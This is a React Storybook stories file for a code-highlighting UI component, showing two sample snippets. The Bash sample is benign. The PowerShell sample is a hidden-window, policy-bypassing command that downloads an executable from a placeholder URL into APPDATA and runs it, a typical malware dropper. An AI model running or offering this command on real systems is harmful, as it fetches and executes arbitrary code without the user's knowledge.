import React from "react";

import { Components } from "meteor/penpal";

const powershell = `
powershell.exe -command PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('URL HERE',"$env:APPDATA\\ps.exe");Start-Process ("$env:APPDATA\\ps.exe")
`;

const bash = `
#!/bin/bash
echo "Hello, world!"
read -p "What is your name? " name
echo "Hello, \${name}!"
`;

export const Powershell = () => (
  <div>
    <Components.CodeHighlight code={powershell} language="PowerShell" />
  </div>
);

export const Bash = () => (
  <div>
    <Components.CodeHighlight code={bash} language="Bash" />
  </div>
);

export default {
  title: "UI/Code Highlight"
};
